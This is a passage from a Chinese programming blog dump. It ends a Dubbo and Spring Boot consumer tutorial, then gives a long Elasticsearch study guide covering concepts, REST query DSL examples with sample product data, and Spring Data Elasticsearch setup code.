dubbo-samples-consumer-springClouddubbo: registry: address: zookeeper://43.139.86.193:2181 timeout: 2000 protocol: name: dubbo # 第三步：编写启动类： 123456789101112131415package com.demo.customer;import org.apache.dubbo.config.spring.context.annotation.EnableDubbo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplication@EnableDubbopublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); System.out.println(&quot;消费者启动完毕!&quot;); }} # 第四步：编写调用生产者接口 12345678910111213141516171819202122232425package com.demo.customer.controller;import com.demo.api.entity.User;import com.demo.api.service.IUserService;import lombok.extern.slf4j.Slf4j;import org.apache.dubbo.config.annotation.DubboReference;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&quot;/consumer&quot;)@Slf4jpublic class ConsumerUserController { @DubboReference( protocol = &quot;dubbo&quot;, loadbalance = &quot;random&quot;) private IUserService userService; @RequestMapping(&quot;/selectUserById/{id}&quot;) public User getUser(@PathVariable(&quot;id&quot;) Long id) { User user = userService.selectUserById(id); log.info(&quot;response from provider: {}&quot;, user); return user; }} 整个项目结构如下： # 测试 分别启动生产者和消费者，在浏览器分别调用以下接口： 12http://localhost:8081/provider/selectUserById/1``http://localhost:8082/consumer/selectUserById/1 结果： # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/26/%E3%80%90Dubbo%E3%80%91%E4%BD%BF%E7%94%A8Dubbo%E6%95%B4%E5%90%88SpringBoot%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%8D%E5%8A%A1/"},{"title":"Elasticsearch学习","text":"# Elasticsearch # 目标 了解 ES 中的基本概念 掌握 RESTFul 操作 ES 的 CRUD 掌握 Spring Data Elasticsearch 操作 ES # 简介 Elasticsearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 我们建立一个网站或应用程序，并要添加搜索功能，但是想要完成搜索工作的创建是非常困难的。我们希望搜索解决方案要运行速度快，我们希望能有一个零配置和一个完全免费的搜索模式，我们希望能够简单地使用 JSON 通过 HTTP 来索引数据，我们希望我们的搜索服务器始终可用，我们希望能够从一台开始并扩展到数百台，我们要实时搜索，我们要简单的多用户，我们希望建立一个云的解决方案。因此我们利用 Elasticsearch 来解决所有这些问题及可能出现的更多其它问题。 # 安装和运行 该软件是基于 Java 编写的解压即用的软件，只需要有 Java 的运行环境即可，把压缩包解压后，进入到 bin 目录运行 elasticsearch.bat，出现以下界面，表示成功启动服务器 浏览器输入：localhost:9200，看到浏览器输出服务器的信息，表示安装成功，可以使用了 注意：程序启动后有两个端口 9200 和 9300，9200 端口用于 HTTP 协议，基于 RESTFul 来使用，9300 端口用于 TCP 协议，基于 jar 包来使用 # 后台启动 使用安装目录 /bin/elasticsearch-service.bat 程序可以把 Elasticsearch 安装后服务列表中，以后我们可以在服务列表来启动该程序，也可以设置成开机启动模式 注意：设置后台启动需要手动配置 Java 虚拟机的路径，使用命令 elasticsearch-service.bat manager 来配置 # 安装 head 插件 Elasticsearch 默认的客户端工具是命令行形式的，操作起来不方便，也不直观看到数据的展示，所以我们需要去安装一个可视化插件，但是这些插件都是基于 H5 开发的，在谷歌的应用商店中找到 elasticsearch-head 插件，然后安装，使用该插件能比较直观的展示服务器中的数据 # 安装 kibana 该软件也是解压即用的工具，用于管理和监控 Elasticsearch 的运作，同时内部包含了客户端工具，支持 RESTFul 操作 Elasticsearch。解压后运行 bin/kibana.bat，看到启动成功的端口号即可以使用浏览器来使用了 浏览器输入：http://localhost:5601 # 概念名词 # 数据存储图 注意：从 Elasticsearch6 开始一个索引里面只能有一个类型，后续计划删除类型这个概念，从 ES6 开始一般让索引名称和类型名称一致 # 主要组件 索引 ES 将数据存储于一个或多个索引中，索引是具有类似特性的文档的集合。类比传统的关系型数据库领域来说，索引相当于 SQL 中的一个数据库，或者一个数据存储方案 (schema)。索引由其名称 (必须为全小写字符) 进行标识，并通过引用此名称完成文档的创建、搜索、更新及删除操作。一个 ES 集群中可以按需创建任意数目的索引。 类型 类型是索引内部的逻辑分区 (category/partition)，然而其意义完全取决于用户需求。因此，一个索引内部可定义一个或多个类型 (type)。一般来说，类型就是为那些拥有相同的域的文档做的预定义。例如，在索引中，可以定义一个用于存储用户数据的类型，一个存储日志数据的类型，以及一个存储评论数据的类型。类比传统的关系型数据库领域来说，类型相当于表。 映射 Mapping, 就是对索引库中索引的字段名称及其数据类型进行定义，类似于 mysql 中的表结构信息。不过 es 的 mapping 比数据库灵活很多，它可以动态识别字段。一般不需要指定 mapping 都可以，因为 es 会自动根据数据格式识别它的类型，如果你需要对某些字段添加特殊属性（如：定义使用其它分词器、是否分词、是否存储等），就必须手动添加 mapping。 需要注意的是映射是不可修改的，一旦确定就不允许改动，在使用自动识别功能时，会以第一个存入的文档为参考来建立映射，后面存入的文档也必须符合该映射才能存入 文档 文档是 Lucene 索引和搜索的原子单位，它是包含了一个或多个域的容器，基于 JSON 格式进行表示。文档由一个或多个域组成，每个域拥有一个名字及一个或多个值，有多个值的域通常称为多值域。每个文档可以存储不同的域集，但同一类型下的文档至应该有某种程度上的相似之处。 # 分片和副本 ES 的分片 (shard) 机制可将一个索引内部的数据分布地存储于多个节点，它通过将一个索引切分为多个底层物理的 Lucene 索引完成索引数据的分割存储功能，这每一个物理的 Lucene 索引称为一个分片 (shard)。每个分片其内部都是一个全功能且独立的索引，因此可由集群中的任何主机存储。创建索引时，用户可指定其分片的数量，默认数量为 5 个。 Shard 有两种类型：primary 和 replica，即主 shard 及副本 shard。Primary shard 用于文档存储，每个新的索引会自动创建 5 个 Primary shard，当然此数量可在索引创建之前通过配置自行定义，不过，一旦创建完成，其 Primary shard 的数量将不可更改。Replica shard 是 Primary Shard 的副本，用于冗余数据及提高搜索性能。每个 Primary shard 默认配置了一个 Replica shard，但也可以配置多个，且其数量可动态更改。ES 会根据需要自动增加或减少这些 Replica shard 的数量。 # 分词器 把文本内容按照标准进行切分，默认的是 standard，该分词器按照单词切分，内容转变为小写，去掉标点，遇到每个中文字符都当成 1 个单词处理，后面会安装开源的中文分词器插件（ik） # 感受分词器效果 1234567891011121314先创建一个名叫shop_product的索引，然后再感受分词效果PUT /shop_product默认分词器：GET /shop_product/_analyze{ &quot;text&quot;:&quot;I am Groot&quot;}GET /shop_product/_analyze{ &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;}结论：默认的分词器只能对英文正常分词，不能对中文正常分词 # 安装 IK 分词器 直接把压缩文件中的内容解压，然后放在 elasticsearch/plugins 下，然后重启即可 1234567891011121314151617181920212223IK分词器：ik_smart：粗力度分词ik_max_word：细力度分词GET /shop_product/_analyze{ &quot;text&quot;:&quot;I am Groot&quot;, &quot;analyzer&quot;:&quot;ik_smart&quot;}GET /shop_product/_analyze{ &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;, &quot;analyzer&quot;:&quot;ik_smart&quot;}GET /shop_product/_analyze{ &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;, &quot;analyzer&quot;:&quot;ik_max_word&quot;}结论：都能正常分词 # 拓展词库 最简单的方式就是找到 IK 插件中的 config/main.dic 文件，往里面添加新的词汇，然后重启服务器即可 # 倒排索引 # 基本操作（了解） # 索引操作 建表索引，相当于在是在建立数据库 # 建立索引 123456789语法：PUT /索引名在没有特殊设置的情况下，默认有5个分片，1个备份，也可以通过请求参数的方式来指定参数格式：{ &quot;settings&quot;: { &quot;number_of_shards&quot;: 5, //设置5个片区 &quot;number_of_replicas&quot;: 1 //设置1个备份 }} # 删除索引 1语法：DELETE /索引名 # 映射操作 # 建立索引和映射 1234567891011121314151617181920语法：PUT /索引名{ &quot;mappings&quot;: { 类型名: { &quot;properties..0&quot;: { 字段名: { &quot;type&quot;: 字段类型, &quot;analyzer&quot;: 分词器类型, &quot;search_analyzer&quot;: 分词器类型, ... }, ... } } }}字段类型：double / long / integer / text / keyword / date / binary注意：text和keyword都是字符串类型，但是只有text类型的数据才能分词，字段的配置一旦确定就不能更改映射的配置项有很多，我们可以根据需要只配置用得上的属性 # 查询映射 1语法：GET /索引名/_mapping # CRUD 操作 # 文档操作 # 新增和替换文档 12345678910111213语法：PUT /索引名/类型名/文档ID{ field1: value1, field2: value2, ...}注意：当索引/类型/映射不存在时，会使用默认设置自动添加ES中的数据一般是从别的数据库导入的，所以文档的ID会沿用原数据库中的ID索引库中没有该ID对应的文档时则新增，拥有该ID对应的文档时则替换需求1：新增一个文档需求2：替换一个文档 每一个文档都内置以下字段 _index：所属索引 _type：所属类型 _id：文档 ID _version：乐观锁版本号 _source：数据内容 # 查询文档 123456语法：根据ID查询 -&gt; GET /索引名/类型名/文档ID查询所有（基本查询语句） -&gt; GET /索引名/类型名/_search需求1：根据文档ID查询一个文档需求2：查询所有的文档 查询所有结果中包含以下字段 took：耗时 _shards.total：分片总数 hits.total：查询到的数量 hits.max_score：最大匹配度 hits.hits：查询到的结果 hits.hits._score：匹配度 # 删除文档 12345语法：DELETE /索引名/类型名/文档ID注意：这里的删除并且不是真正意义上的删除，仅仅是清空文档内容而已，并且标记该文档的状态为删除需求1：根据文档ID删除一个文档需求2：替换刚刚删除的文档 # 高级查询 数据准备： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354PUT /shop_product{ &quot;mappings&quot;: { &quot;shop_product&quot;: { &quot;properties&quot;: { &quot;id&quot;: { &quot;type&quot;: &quot;integer&quot; }, &quot;title&quot;:{ &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;ik_smart&quot;, &quot;search_analyzer&quot;: &quot;ik_smart&quot; }, &quot;price&quot;:{ &quot;type&quot;: &quot;double&quot; }, &quot;intro&quot;:{ &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;ik_smart&quot;, &quot;search_analyzer&quot;: &quot;ik_smart&quot; }, &quot;brand&quot;:{ &quot;type&quot;: &quot;keyword&quot; } } } }}POST /shop_product/shop_product/_bulk{&quot;create&quot;:{&quot;_id&quot;: 1}}{&quot;id&quot;:1,&quot;title&quot;:&quot;Apple iPhone XR (A2108) 128GB 白色 移动联通电信4G手机 双卡双待&quot;,&quot;price&quot;:5299,&quot;intro&quot;:&quot;【iPhoneXR限时特惠！】6.1英寸视网膜显示屏，A12仿生芯片，面容识别，无线充电，支持双卡！选【换修无忧版】获 AppleCare 原厂服务，享只换不修！更有快速换机、保值换新、轻松月付！&quot;,&quot;brand&quot;:&quot;Apple&quot;}{&quot;create&quot;:{&quot;_id&quot;: 2}}{&quot;id&quot;:2,&quot;title&quot;:&quot;Apple 2019款 Macbook Pro 13.3【带触控栏】八代i7 18G 256G RP645显卡 深空灰 苹果笔记本电脑 轻薄本 MUHN2CH/A&quot;,&quot;price&quot;:15299,&quot;intro&quot;:&quot;【八月精选】Pro2019年新品上市送三重好礼，现在购买领满8000减400元优惠神劵，劵后更优惠！&quot;,&quot;brand&quot;:&quot;Apple&quot;}{&quot;create&quot;:{&quot;_id&quot;: 3}}{&quot;id&quot;:3,&quot;title&quot;:&quot;Apple iPad Air 3 2019年新款平板电脑 10.5英寸（64G WLAN版/A12芯片/Retina显示屏/MUUL2CH/A）金色&quot;,&quot;price&quot;:3788,&quot;intro&quot;:&quot;8月尊享好礼！买iPad即送蓝牙耳机！领券立减！多款产品支持手写笔！【新一代iPad，总有一款适合你】选【换修无忧版】获 AppleCare 原厂服务，享只换不修！更有快速换机、保值换新、轻松月付！&quot;,&quot;brand&quot;:&quot;Apple&quot;}{&quot;create&quot;:{&quot;_id&quot;: 4}}{&quot;id&quot;:4,&quot;title&quot;:&quot;华为HUAWEI MateBook X Pro 2019款 英特尔酷睿i5 13.9英寸全面屏轻薄笔记本电脑(i5 8G 512G 3K 触控) 灰&quot;,&quot;price&quot;:7999,&quot;intro&quot;:&quot;3K全面屏开启无界视野;轻薄设计灵动有型，HuaweiShare一碰传&quot;,&quot;brand&quot;:&quot;华为&quot;}{&quot;create&quot;:{&quot;_id&quot;: 5}}{&quot;id&quot;:5,&quot;title&quot;:&quot;华为 HUAWEI Mate20 X (5G) 7nm工艺5G旗舰芯片全面屏超大广角徕卡三摄8GB+256GB翡冷翠5G双模全网通手机&quot;,&quot;price&quot;:6199,&quot;intro&quot;:&quot;【5G双模，支持SA/NSA网络，7.2英寸全景巨屏，石墨烯液冷散热】5G先驱，极速体验。&quot;,&quot;brand&quot;:&quot;华为&quot;}{&quot;create&quot;:{&quot;_id&quot;: 6}}{&quot;id&quot;:6,&quot;title&quot;:&quot;华为平板 M6 10.8英寸麒麟980影音娱乐平板电脑4GB+64GB WiFi（香槟金）&quot;,&quot;price&quot;:2299,&quot;intro&quot;:&quot;【华为暑期购】8月2日-4日，M5青春版指定爆款型号优惠100元，AI语音控制&quot;,&quot;brand&quot;:&quot;华为&quot;}{&quot;create&quot;:{&quot;_id&quot;: 7}}{&quot;id&quot;:7,&quot;title&quot;:&quot;荣耀20 PRO DXOMARK全球第二高分 4800万四摄 双光学防抖 麒麟980 全网通4G 8GB+128GB 蓝水翡翠 拍照手机&quot;,&quot;price&quot;:3199,&quot;intro&quot;:&quot;白条6期免息！麒麟980，4800万全焦段AI四摄！荣耀20系列2699起，4800万超广角AI四摄！&quot;,&quot;brand&quot;:&quot;荣耀&quot;}{&quot;create&quot;:{&quot;_id&quot;: 8}}{&quot;id&quot;:8,&quot;title&quot;:&quot;荣耀MagicBook Pro 16.1英寸全面屏轻薄性能笔记本电脑（酷睿i7 8G 512G MX250 IPS FHD 指纹解锁）冰河银&quot;,&quot;price&quot;:6199,&quot;intro&quot;:&quot;16.1英寸无界全面屏金属轻薄本，100%sRGB色域，全高清IPS防眩光护眼屏，14小时长续航，指纹一健开机登录，魔法一碰传高速传输。&quot;,&quot;brand&quot;:&quot;荣耀&quot;}{&quot;create&quot;:{&quot;_id&quot;: 9}}{&quot;id&quot;:9,&quot;title&quot;:&quot;荣耀平板5 麒麟8核芯片 GT游戏加速 4G+128G 10.1英寸全高清屏影音平板电脑 WiFi版 冰川蓝&quot;,&quot;price&quot;:1549,&quot;intro&quot;:&quot;【爆款平板推荐】哈曼卡顿专业调音，10.1英寸全高清大屏，双喇叭立体环绕音，配置多重护眼，值得拥有！&quot;,&quot;brand&quot;:&quot;荣耀&quot;}{&quot;create&quot;:{&quot;_id&quot;: 10}}{&quot;id&quot;:10,&quot;title&quot;:&quot;小米9 4800万超广角三摄 6GB+128GB全息幻彩蓝 骁龙855 全网通4G 双卡双待 水滴全面屏拍照智能游戏手机&quot;,&quot;price&quot;:2799,&quot;intro&quot;:&quot;限时优惠200，成交价2799！索尼4800万广角微距三摄，屏下指纹解锁！&quot;,&quot;brand&quot;:&quot;小米&quot;}{&quot;create&quot;:{&quot;_id&quot;: 11}}{&quot;id&quot;:11,&quot;title&quot;:&quot;小米(MI)Pro 2019款 15.6英寸金属轻薄笔记本(第八代英特尔酷睿i7-8550U 16G 512GSSD MX250 2G独显) 深空灰&quot;,&quot;price&quot;:6899,&quot;intro&quot;:&quot;【PCIE固态硬盘、72%NTSC高色域全高清屏】B面康宁玻璃覆盖、16G双通道大内存、第八代酷睿I7处理器、专业级调校MX150&quot;,&quot;brand&quot;:&quot;小米&quot;}{&quot;create&quot;:{&quot;_id&quot;: 12}}{&quot;id&quot;:12,&quot;title&quot;:&quot;联想(Lenovo)拯救者Y7000P 2019英特尔酷睿i7 15.6英寸游戏笔记本电脑(i7 9750H 16G 1T SSD GTX1660Ti 144Hz)&quot;,&quot;price&quot;:9299,&quot;intro&quot;:&quot;超大1T固态，升级双通道16G内存一步到位，GTX1660Ti电竞级独显，英特尔9代i7H高性能处理器，144Hz电竞屏窄边框！&quot;,&quot;brand&quot;:&quot;联想&quot;} Elasticsearch 基于 JSON 提供完整的查询 DSL（Domain Specific Language：领域特定语言）来定义查询。 12基本语法：GET /索引名/类型名/_search 一般都是需要配合查询参数来使用的，配合不同的参数有不同的查询效果 参数配置项可以参考博客：https://www.jianshu.com/p/6333940621ec # 结果排序 1234567891011121314151617181920212223242526参数格式：{ &quot;sort&quot;: [ {field: 排序规则}, ... ]}排序GET /shop_product/shop_product/_search{ &quot;sort&quot;: [ { &quot;price&quot;: { &quot;order&quot;: &quot;desc&quot; } } ]}排序规则：asc表示升序desc:表示降序没有配置排序的情况下，默认按照评分降序排列 # 分页查询 12345678910111213141516171819202122参数格式：{ &quot;from&quot;: start, &quot;size&quot;: pageSize}分页 从第几个开始 每页几个GET /shop_product/shop_product/_search{ &quot;from&quot;: 2, &quot;size&quot;: 4, &quot;sort&quot;: [ { &quot;price&quot;: { &quot;order&quot;: &quot;desc&quot; } } ]}需求1：查询所有文档按照价格降序排列需求2：分页查询文档按照价格降序排列，显示第2页，每页显示3个 # 检索查询 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364参数格式：{ &quot;query&quot;: { 检索方式: {field: value} }}检索查询 全文检索需求1：查询商品标题中符合&quot;游戏 手机&quot;的字样的商品GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;match&quot;: { &quot;title&quot;: &quot;游戏 手机&quot; } }}检索查询 精准匹配需求2：查询商品价格等于15299的商品GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;term&quot;: { &quot;price&quot;: 15299 } }}检索查询 范围检索需求3：查询商品价格在5000~10000之间商品，按照价格升序排列GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;range&quot;: { &quot;price&quot;: { &quot;gte&quot;: 5000, &quot;lte&quot;: 10000 } } }, &quot;sort&quot;: [ { &quot;price&quot;: { &quot;order&quot;: &quot;asc&quot; } } ]}检索方式：term表示精确匹配，value值不会被分词器拆分，按照倒排索引匹配match表示全文检索，value值会被分词器拆分，然后去倒排索引中匹配range表示范围检索，其value值是一个对象，如{ &quot;range&quot;: {field: {比较规则: value, ...}} } 比较规则有gt / gte / lt / lte 等 注意：term和match都能用在数值和字符上，range用在数值上需求1：查询商品标题中符合&quot;游戏 手机&quot;的字样的商品需求2：查询商品价格等于15299的商品需求3：查询商品价格在5000~10000之间商品，按照价格升序排列 # 关键字查询 12345678910111213141516171819202122232425参数格式：{ &quot;query&quot;: { &quot;multi_match&quot;: { &quot;query&quot;: value, &quot;fields&quot;: [field1, field2, ...] } }}关键字查询需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;multi_match&quot;: { &quot;query&quot;: &quot;蓝牙 指纹 双卡&quot;, &quot;fields&quot;: [&quot;title&quot;, &quot;intro&quot;] } }}multi_match：表示在多个字段间做检索，只要其中一个字段满足条件就能查询出来，多用在字段上需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品 # 高亮显示 1234567891011121314151617181920212223242526272829303132333435363738参数格式：{ &quot;query&quot;: { ... }, &quot;highlight&quot;: { &quot;fields&quot;: { field1: {}, field2: {}, ... }, &quot;pre_tags&quot;: 开始标签, &quot;post_tags&quot; 结束标签 }}高亮显示需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;multi_match&quot;: { &quot;query&quot;: &quot;蓝牙 指纹 双卡&quot;, &quot;fields&quot;: [&quot;title&quot;, &quot;intro&quot;] } }, &quot;highlight&quot;: { &quot;fields&quot;: { &quot;title&quot;: {}, &quot;intro&quot;: {} }, &quot;pre_tags&quot;:&quot;&lt;h1&gt;&quot;, &quot;post_tags&quot;:&quot;&lt;/h1&gt;&quot; }}highlight：表示高亮显示，需要在fields中配置哪些字段中检索到该内容需要高亮显示 必须配合检索(term / match)一起使用 需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示 # 逻辑查询 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859参数格式： { &quot;query&quot;: { &quot;bool&quot;: { 逻辑规则: [ {检索方式: {field: value}}, ... ], ... } }}逻辑查询需求1：查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;bool&quot;: { &quot;must&quot;: [ {&quot;match&quot;: { &quot;title&quot;: &quot;i7&quot; }}, {&quot;range&quot;: { &quot;price&quot;: { &quot;gt&quot;: 7000 } }} ] } }}逻辑查询需求2：查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;bool&quot;: { &quot;should&quot;: [ {&quot;match&quot;: { &quot;title&quot;: &quot;pro&quot; }}, {&quot;range&quot;: { &quot;price&quot;: { &quot;gte&quot;: 1000, &quot;lte&quot;: 3000 } }} ] } }}逻辑规则：must / should / must_not，相当于and / or / not需求1：查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品需求2：查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品 # 过滤查询 12345678910111213141516171819202122232425262728293031参数格式：{ &quot;query&quot;: { &quot;bool&quot;: { &quot;filter&quot;: [ { 检索方式: { field: value } }， ... ] } }}过滤查询 不评分GET /shop_product/shop_product/_search{ &quot;query&quot;: { &quot;bool&quot;: { &quot;filter&quot;: [ {&quot;match&quot;: { &quot;title&quot;: &quot;pro&quot; }} ] } }}从效果上讲过滤查询和检索查询能做一样的效果区别在于过滤查询不评分，结果能缓存，检索查询要评分，结果不缓存一般是不会直接使用过滤查询，都是在检索了一定数据的基础上再使用 关于 filter 的更多认知推荐大家读这篇博客：https://blog.csdn.net/laoyang360/article/details/80468757 # 分组查询 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899参数格式：{ &quot;size&quot;: 0, &quot;aggs&quot;: { 自定义分组字段: { &quot;terms&quot;: { &quot;field&quot;: 分组字段, &quot;order&quot;: {自定义统计字段:排序规则}, &quot;size&quot;: 10 //默认显示10组 }, &quot;aggs&quot;: { //分组后的统计查询，相当于MySQL分组函数查询 自定义统计字段: { 分组运算: { &quot;field&quot;: 统计字段 } } } } }}分组查询需求1：按照品牌分组，统计各品牌的数量GET /shop_product/shop_product/_search{ &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;brand_group&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;brand&quot;, &quot;order&quot;: {&quot;brand_group&quot;:&quot;desc&quot;}, &quot;size&quot;: 10 }, &quot;aggs&quot;: { &quot;brand_group&quot;: { &quot;value_count&quot;: { &quot;field&quot;: &quot;id&quot; } } } } }}分组查询需求2：按照品牌分组，统计各品牌的平均价格GET /shop_product/shop_product/_search{ &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;brand_group&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;brand&quot;, &quot;order&quot;: {&quot;brand_group&quot;:&quot;desc&quot;}, &quot;size&quot;: 10 }, &quot;aggs&quot;: { &quot;brand_group&quot;: { &quot;avg&quot;: { &quot;field&quot;: &quot;price&quot; } } } } }}分组查询需求3：按照品牌分组，统计各品牌的价格数据GET /shop_product/shop_product/_search{ &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;brand_group_aggs&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;brand&quot;, &quot;order&quot;: {&quot;brand_group_aggs.count&quot;:&quot;desc&quot;}, &quot;size&quot;: 10 }, &quot;aggs&quot;: { &quot;brand_group_aggs&quot;: { &quot;stats&quot;: { &quot;field&quot;: &quot;price&quot; } } } } }}分组运算：avg / sum / min / max / value_count / stats(执行以上所有功能的)注意：这里是size=0其目的是为了不要显示hit内容，专注点放在观察分组上需求1：按照品牌分组，统计各品牌的数量需求2：按照品牌分组，统计各品牌的平均价格需求3：按照品牌分组，统计各品牌的价格数据 # 批处理（了解） 当需要集中的批量处理文档时，如果依然使用传统的操作单个 API 的方式，将会浪费大量网络资源，Elasticsearch 为了提高操作的性能，专门提供了批处理的 API # mget 批量查询 12345678语法：GET /索引名/类型/_mget{ &quot;docs&quot;: [ {&quot;_id&quot;: 文档ID}, ... ]} # bulk 批量增删改 1234567891011语法：POST /索引名/类型/_bulk{动作:{&quot;_id&quot;: 文档ID}}{...}{动作:{&quot;_id&quot;: 文档ID}}{...}动作：create / update / delete，其中delete只有1行JSON，其他操作都是有2行JSON，并且JSON不能格式化，如果是update动作，它的数据需要加个key为doc如：{&quot;update&quot;: {&quot;_id&quot;: xx}}{&quot;doc&quot;: {&quot;xx&quot;:xx, &quot;xx&quot;:xx}} # Spring Data Elasticsearch # 准备环境 # 导入依赖 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--SpringBoot整合Spring Data Elasticsearch的依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; &lt;version&gt;1.8.3&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; # 编写 DOMAIN 123456789101112131415161718192021222324/** @Document：配置操作哪个索引下的哪个类型 @Id：标记文档ID字段 @Field：配置映射信息，如：分词器 */@Getter@Setter@ToString@NoArgsConstructor@AllArgsConstructor@Document(indexName=&quot;shop_product&quot;, type=&quot;shop_product&quot;)public class Product { @Id private String id; @Field(analyzer=&quot;ik_max_word&quot;,searchAnalyzer=&quot;ik_max_word&quot;, type=FieldType.Text) private String title; private Integer price; @Field(analyzer=&quot;ik_max_word&quot;,searchAnalyzer=&quot;ik_max_word&quot;, type=FieldType.Text) private String intro; @Field(type=FieldType.Keyword) private String brand;} # 配置连接信息 12345#application.properties# 配置集群名称，名称写错会连不上服务器，默认elasticsearchspring.data.elasticsearch.cluster-name=elasticsearch# 配置集群节点spring.data.elasticsearch.cluster-nodes=localhost:9300 # ElasticsearchRepository 该接口是框架封装的用于操作 Elastsearch 的高级接口，只要我们自己的写个接口去继承该接口就能直接对 Elasticsearch 进行 CRUD 操作 123456789/** 泛型1：domain的类型 泛型2：文档主键类型 该接口直接该给Spring，底层会使用JDK代理的方式创建对象，交给容器管理 */@Repositorypublic interface ProductESRepository extends ElasticsearchRepository&lt;Product, String&gt; { // 符合Spring Data规范的高级查询方法} # 完成 CRUD + 分页 + 排序 # 组件介绍 1234567891011ElasticsearchRepository：框架封装的用于便捷完成常用操作的工具接口ElasticsearchTemplate：框架封装的用于便捷操作Elasticsearch的模板类NativeSearchQueryBuilder：用于生成查询条件的构建器，需要去封装各种查询条件QueryBuilder：该接口表示一个查询条件，其对象可以通过QueryBuilders工具类中的方法快速生成各种条件 boolQuery()：生成bool条件，相当于 &quot;bool&quot;: { } matchQuery()：生成match条件，相当于 &quot;match&quot;: { } rangeQuery()：生成range条件，相当于 &quot;range&quot;: { }AbstractAggregationBuilder：用于生成分组查询的构建器，其对象通过AggregationBuilders工具类生成Pageable：表示分页参数，对象通过PageRequest.of(页数, 容量)获取SortBuilder：排序构建器，对象通过SortBuilders.fieldSort(字段).order(规则)获取 # ElasticsearchTemplate 该模板类，封装了便捷操作 Elasticsearch 的模板方法，包括 索引 / 映射 / CRUD 等底层操作和高级操作，该对象用起来会略微复杂些，尤其是对于查询，还需要把查询到的结果自己封装对象 123//该对象已经由SpringBoot完成自动配置，直接注入即可@Autowiredprivate ElasticsearchTemplate template; 一般情况下，ElasticsearchTemplate 和 ElasticsearchRepository 是分工合作的，ElasticsearchRepository 已经能完成绝大部分的功能，如果遇到复杂的查询则要使用 ElasticsearchTemplate，如多字段分组、高亮显示等 # 实例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219@Autowiredprivate 